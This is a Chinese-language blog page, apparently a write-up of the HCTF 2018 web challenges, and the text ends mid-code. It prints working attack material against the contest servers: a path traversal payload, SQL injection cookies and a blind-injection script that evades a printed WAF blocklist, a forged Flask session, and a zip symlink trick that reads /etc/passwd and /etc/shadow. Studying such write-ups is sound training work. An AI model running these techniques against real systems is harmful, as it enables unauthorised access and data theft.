@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          hctf2018-web writeup - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/11/hctf2018-web-writeup/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                          <a class="tag" href="/tags/#hctf" title="hctf">hctf</a>
+                        
+                    </div>
+                    <h1>hctf2018-web writeup</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-11-12
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>去年参加hctf的时候还是个小萌新，正好这个周末没什么事情参加了一下htcf的十周年纪念版，题目质量很高哈</p>
+<p>和队友一起有幸做出了几道web题，记录并学习一下。（web狗只会做web。。。</p>
+<h1 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h1><p>签到题，题目比较简单</p>
+<p>html源码里能看到<code>source.php</code>的提示，从而可以获取到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一个任意文件读取，但是需要<code>?</code>前的字符为<code>source.php</code>或者<code>hint.php</code></p>
+<p>常规方式应该是无法利用的，但是这里很刻意的写了个<code>$_page = urldecode($page);</code>，所以传参的时候只要两次url_encode就可以任意文件读取了</p>
+<p>最后payload</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>warmup.<span class="number">2018</span>.hctf.io<span class="regexp">/index.php?file=hint.php%253F/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/1.png" alt></p>
+<h1 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h1><p>一个钓鱼网站，一进去就跳转，就只好扫一波目录</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/2.png" alt></p>
+<p><code>www.zip</code>下载下来之后就是网站源码，然后就是一波源码审计</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>定位到一个点<code>include/member.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'IN_CRONLITE'</span>)) <span class="keyword">exit</span>();</span><br><span class="line">$islogin = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"islogin"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"login_data"</span>]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">'login_data'</span>], <span class="keyword">true</span>);</span><br><span class="line">        $admin_user = $login_data[<span class="string">'admin_user'</span>];</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"</span>);</span><br><span class="line">        <span class="keyword">if</span> ($udata[<span class="string">'username'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[<span class="string">'password'</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> ($admin_pass == $login_data[<span class="string">'admin_pass'</span>]) &#123;</span><br><span class="line">            $islogin = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+<p>重点在<code>$login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);</code></p>
+<p>直接从<code>$_COOKIE</code>中取的数据，并且直接拼接到了SQL语句中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$udata = $DB-&gt;get_row(<span class="string">"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"</span>);</span><br></pre></td></tr></table></figure>
+<p>在本地搭建好环境后测试一波，我这里直接把SQL语句给die了出来</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/3.png" alt></p>
+<p>出现了一些奇怪的东西，最后定位到<code>admin/safe.php</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $blacklist = <span class="string">'/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace_callback($blacklist, <span class="function"><span class="keyword">function</span> <span class="params">($match)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'@'</span> . $match[<span class="number">0</span>] . <span class="string">'@'</span>;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了蛮多的字符，最后找到一个可以登录的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">islogin=<span class="number">1</span>; </span><br><span class="line">login_data=&#123;<span class="string">"admin_user"</span>:<span class="string">"admin'\rand\r'0"</span>,<span class="string">"admin_pass"</span>:<span class="string">"3aa526bed244d14a09ddcc49ba36684866ec7661"</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>此时的sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> fish_admin <span class="keyword">WHERE</span> username=<span class="string">'admin'</span>\<span class="keyword">rand</span>\r<span class="string">'0'</span> <span class="keyword">limit</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>这样<code>$udata</code>的值就恒为<code>NULL</code>，从而cookie中的<code>admin_pass</code>就为定值，可以伪造admin登录</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/4.png" alt></p>
+<p>进去之后搜了一波没找到什么有用的东西，最后还是把目光转回了SQL注入中，是否还能注入些更有用的数据呢？</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>根据waf找了一个勉强可以注入的语句</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"admin_user"</span>:<span class="string">"admin'\rand\rlpad(user(),&#123;&#125;,2)in('r00t')\rand'1"</span>,<span class="attr">"admin_pass"</span>:<span class="string">"3aa526bed244d14a09ddcc49ba36684866ec7661"</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>这时的SQL语句就变为了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> fish_admin <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">lpad</span>(<span class="string">`username`</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="keyword">in</span>(<span class="string">'a'</span>) <span class="keyword">and</span><span class="string">'1'</span> <span class="keyword">limit</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p>就可以通过是否登录成功进行盲注</p>
+<p>这时候勉强可以注入出<code>user()</code>、<code>username</code>这些无关痛痒的信息，但是当想注表名之类的数据时，就会因为<code>information</code>中存在<code>or</code>而无法注入</p>
+<p>最后，组内一个大佬提示了一波unicode编码</p>
+<blockquote>
+<p>json_decode在解码的时候会进行一次unicode解码</p>
+</blockquote>
+<p>这样问题就好解决了，只要把被过滤的字符进行unicode编码然后传入就可以了，写了一个python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://kzone.2018.hctf.io/admin/login.php"</span></span><br><span class="line"></span><br><span class="line">rg = <span class="string">'._- &#123;&#125;'</span>+string.digits+string.ascii_letters+<span class="string">'&amp;'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> rg:</span><br><span class="line">		cookies = &#123;</span><br><span class="line">			<span class="string">"islogin"</span>:<span class="string">"1"</span>,</span><br><span class="line">			<span class="comment"># 'login_data': r'''&#123;&#123;"admin_user":"admin'\rand\rlpad((select\rcolumn_name\rfrom\rinf\u006frmation_schema.columns\rwhere\rtable_name\u003d'F1444g'limit\r1),&#123;&#125;,2)in('&#123;&#125;&#123;&#125;')\rand'1","admin_pass":"3aa526bed244d14a09ddcc49ba36684866ec7661"&#125;&#125;'''.format(l+1,flag, i)</span></span><br><span class="line">			<span class="string">'login_data'</span>: <span class="string">r'''&#123;&#123;"admin_user":"admin'\rand\rlpad((select\rf1a9\rfrom\rF1444g\rlimit\r1),&#123;&#125;,2)in('&#123;&#125;&#123;&#125;')\rand'1","admin_pass":"3aa526bed244d14a09ddcc49ba36684866ec7661"&#125;&#125;'''</span>.format(l+<span class="number">1</span>,flag, i)	</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		r = requests.get(url, cookies=cookies)</span><br><span class="line">		print(i, end=<span class="string">"\r"</span>)</span><br><span class="line">		<span class="comment"># print("\r")</span></span><br><span class="line">		<span class="keyword">if</span> len(r.text) &gt; <span class="number">1000</span>:</span><br><span class="line">			flag+=i</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> i == <span class="string">'&amp;'</span>:</span><br><span class="line">			exit()</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/5.png" alt></p>
+<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>一开始有点懵，不知道做什么，后来在改密码的地方发现了源码泄露（不得不说蛮隐秘。。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>下载下来之后，可以在<code>templates/index.html</code>中看到</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if current_user.is_authenticated and session['name'] == 'admin' %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+<p>说明只要session中的name值为admin就可以看到flag</p>
+<p>flask中session的一些问题可以看p神的<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
+<p>需要伪造session就需要<code>app.config[&#39;SECRET_KEY&#39;]</code>的值一致才可以伪造，这里可以很明显的看到、</p>
+<p>config.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br></pre></td></tr></table></figure>
+<p>在本地起了环境之后可以发现<code>os.environ.get(&#39;SECRET_KEY&#39;)</code>是不存在的</p>
+<p>所以<code>SECRET_KEY</code>的值就为固定的<code>cjk123</code></p>
+<p>这样，就比较简单了。在本地中删除admin的账户，再注册一个admin既可获取到对应的session</p>
+<p>利用这个session放到比赛环境中，就可以成功伪造</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=.eJxFkEGLgzAQhf_KMucebIoXoYeFbIsLk<span class="number">6</span>DEyuRSutUao<span class="number">3</span>FBW<span class="number">6</span>op_e<span class="number">8</span>burB<span class="number">7</span>fe_Nx<span class="number">3</span>vzgONlrCcDyXW<span class="number">81</span>Ss<span class="number">4</span>thUkD<span class="number">3</span>j<span class="number">7</span>ggSQaYs<span class="number">875</span>ClkeSml<span class="number">1</span><span class="keyword">x</span><span class="number">0</span>Yp_<span class="number">3</span>cr<span class="number">8</span>zwnez<span class="number">8</span>O-MWN<span class="number">5</span>TiQu<span class="number">5</span>T<span class="number">0</span>PlwQVt<span class="number">0</span>cq<span class="number">0</span>wqYMbbjlKSNPH<span class="keyword">i1</span>FwlEseO<span class="number">60</span>ShdZprFUlUXbMM<span class="number">2</span>LWdtsIUUxOryTP<span class="number">8</span>daFbEus<span class="number">1</span>mUwkllevR<span class="number">5</span>yOousI<span class="number">1</span>WwghFa_LNXapuRlts<span class="number">4</span>bmC<span class="number">8</span>zRejtfvrh<span class="number">7</span>-J<span class="number">1</span>hj<span class="number">0</span>WcbqZAJv<span class="number">2</span>vJ<span class="number">0</span>QZ<span class="number">5</span>s<span class="number">7</span>xw<span class="number">7</span>NAKFeqWH<span class="number">5</span>F<span class="number">2</span>h<span class="number">1</span>ArzHHZorPtC<span class="number">9e6</span>U<span class="number">1</span>P_kYr<span class="number">9</span>dVD<span class="number">3</span>X<span class="number">2</span><span class="keyword">c</span><span class="number">4</span>uWDAqXLtACu<span class="number">4</span>TfX<span class="number">4</span>-husI<span class="number">3</span>j-AJEPb<span class="number">0</span>Q.W-ecjw.kmDKDiOWm-kN<span class="number">8</span>mitYFL-eVyT<span class="number">2</span>dQ</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/11.png" alt></p>
+<h1 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h1><h2 id="zip软连接"><a href="#zip软连接" class="headerlink" title="zip软连接"></a>zip软连接</h2><p>进入之后是一个上传zip的功能，首先想到的就是zip软连接的问题</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd passwd</span><br><span class="line"><span class="keyword">zip</span> -y passwd.<span class="keyword">zip</span> passwd</span><br></pre></td></tr></table></figure>
+<p>生成一个zip文件上传后，也正如预料的，成功读取到了<code>/etc/passwd</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/6.png" alt></p>
+<p>但是这貌似才刚刚开始，然后呢，尝试读取了<code>/flag</code>、<code>app/run.py</code>之类的文件都没有对应的数据返回</p>
+<p>但是可以读取<code>/etc/shadow</code>，说明权限是<code>root</code></p>
+<h2 id="一切皆文件"><a href="#一切皆文件" class="headerlink" title="一切皆文件"></a>一切皆文件</h2><p>这里卡了蛮久的，然后再网上搜索了一番，利用linux中一切皆文件的性质，尝试读取一些运行状态信息</p>
+<p>最后读取了<code>/proc/self/environ</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/7.png" alt></p>
+<p>貌似看到了一些有用的信息</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">UWSGI_INI</span>=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</span><br><span class="line"><span class="attr">PWD</span>=/app/hard_t0_guess_n9f5a95b5ku9fg</span><br></pre></td></tr></table></figure>
+<p>尝试读取下这个配置文件，可以获取到文件名</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/hctf2018-web-writeup/8.png" alt></p>
+<p>尝试读取</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/app/</span>hard_t0_guess_n9f5a95b5ku9fg<span class="regexp">/hard_t0_guess_also_df45v48ytj9_main.py</span></span><br></pre></td></tr></table></figure>
+<p>就可以读取到源码</p>
+<h2 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span 